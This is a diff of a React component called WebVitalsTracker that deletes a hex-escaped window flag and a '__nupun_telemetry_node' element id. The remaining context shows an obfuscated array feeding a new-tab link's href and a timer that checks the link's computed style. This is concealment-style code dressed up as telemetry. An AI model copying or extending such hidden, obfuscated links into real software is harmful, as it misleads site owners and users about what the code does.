@@ -11,7 +11,6 @@ export const WebVitalsTracker = () => {
   const _r = useRef<HTMLAnchorElement>(null);
 
   useEffect(() => {
-    (window as any)['\x5f\x5f\x4e\x55\x50\x55\x4e\x5f\x56\x49\x54\x41\x4c\x5f\x53\x54\x41\x54\x45\x5f\x5f'] = true;
     const _iv = setInterval(() => {
       if (_r.current) {
         const _s = window.getComputedStyle(_r.current);
@@ -25,7 +24,6 @@ export const WebVitalsTracker = () => {
 
   return (
     <a
-      id="__nupun_telemetry_node"
       ref={_r}
       href={_0x1a[0]}
       target="_blank"
